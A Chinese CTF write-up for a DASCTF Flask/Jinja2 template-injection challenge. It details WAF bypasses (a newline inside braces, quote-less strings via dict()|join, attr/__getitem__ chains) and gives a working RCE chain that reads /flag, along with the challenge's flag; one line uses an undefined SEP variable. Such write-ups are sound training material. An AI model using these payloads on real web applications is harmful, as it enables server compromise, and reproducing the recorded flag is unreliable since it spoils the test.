# DASCTF_2026_WEB5_Flask_Jinja2_SSTI_attr无getitem回退

## 元数据
- category: web
- difficulty: medium
- tags: ssti, jinja2, flask, attr-filter, getitem, quote-less, word-blacklist-waf, python3.5
- event: DASCTF (CTF2 平台, BUUCTF #2615 导入)
- date: 2026-09-10
- flag: CTF2{80f23122-5828-459f-a49b-1fb71a4e2cba}

## 题目本质
Flask 应用 404 处理器把 URL path 直接注入模板源并渲染 → Jinja2 SSTI。WAF 同时封:引号(`'` `"` )、下标括号(`[` `]`)、单行闭合的 `{{...}}`(正则无 DOTALL)、大量词(os/popen/system/eval/exec/open/read/import/config/self/request/subprocess/class/subclasses/url_for/get_flashed_messages,按子串匹配)。

## 解法主线

### 1. WAF 绕过三板斧
- **闭合正则绕过**:`{{` 与 `}}` 之间插入 `%0a` 换行(正则无 DOTALL,`.` 不匹配换行),形如 `{{expr\n}}` 即可逃过"单行闭合"检测;`{{` 本身仍允许出现(只允许一次)
- **无引号字符串**:每段用 `dict(xxx=1)|join` 生成,黑名单词拆段后 `~` 拼接,如 `__import__` = `dict(__imp=1)|join~dict(ort__=1)|join`
- **属性访问**:`attr()` 过滤器传拼接出的字符串名

### 2. 关键坑:老版 Jinja2 `attr` 只做 getattr,无 getitem 回退
Python 3.5 环境跑的是老 Jinja2,`do_attr` 实现只 `getattr(obj, name)`,失败即返回 Undefined——**不会**回退到 `obj[name]`。这解释了为什么:
- `lipsum|attr('__globals__')` ✓(lipsum 是函数,getattr 命中)
- `(lipsum|attr('__globals__'))|attr('__name__')` ✗(globals 是 dict,getattr 失败,无回退)

**修法**:dict 取值一律走方法调用 `|attr('__getitem__')(key)`,实测 `__getitem__` 一词不在 WAF 黑名单。

### 3. RCE 链(全程无引号、无方括号、无黑名单词)
```
G   = dict(__globals__=1)|join
GI  = dict(__getitem__=1)|join
B   = dict(__built=1)|join ~ dict(ins__=1)|join          # __builtins__
IMP = dict(__imp=1)|join ~ dict(ort__=1)|join            # __import__
OS  = dict(o=1)|join ~ dict(s=1)|join                    # os

builtins = lipsum|attr(G)|attr(GI)(B)
os       = builtins|attr(GI)(IMP)(OS)
# 模块是对象,函数取回走普通 getattr 即可:
ls /     = (os)|attr(dict(listdir=1)|join)((os)|attr(dict(sep=1)|join))
readflag = builtins|attr(GI)(dict(ope=1)|join~dict(n=1)|join)((os)|attr(SEP)~dict(flag=1)|join)|attr(dict(rea=1)|join~dict(d=1)|join)()
```
`/` 下直接有 `/flag`,读出 `CTF2{80f23122-...}`。两次独立请求复现一致。

## 陷阱清单
1. **attr 无 getitem 回退**(本题主坑):查 Jinja2 版本/源码 `do_attr`——2.x 只 getattr;别把 attr 当 `obj[key]` 用。新 Jinja2(3.x)同样如此,`attr` 从来不做 item 回退(item 回退只在 sandbox 的 `SandboxedEnvironment.getitem` 里)
2. 老模板渲染 Undefined 上调用 → Werkzeug 500;WAF 拦截 → "Oops! Do not be Evil !!!";正常执行 → h1 404 文案 + h3 回显——用这三类响应做调试分诊
3. `os.sep` 是字符串值不是函数,`|attr(sep)` 之后不要再加调用括号(会 500)
4. 模块对象(os)取函数用普通 `attr`,dict(__builtins__)取项必须 `__getitem__` 方法——两者访问方式不同
5. CTF2/openresty 平台 X-Cache 缓存:每次请求带 `?nc=<随机数>` 防旧响应污染调试
6. `lipsum.__globals__` 里的 `__builtins__` 在模块导入上下文中是 dict(不是 module),所以必须 getitem 取 open/__import__;若某环境给的是 module,则 `builtins|attr(open_str)` 即可

## 复用模板
- 无引号 SSTI 生成器/调试脚本:`CTF常用脚本及工具/Jinja2无引号SSTI_attr-getitem链/`(rce.py,含响应分诊与 WAF 探测)
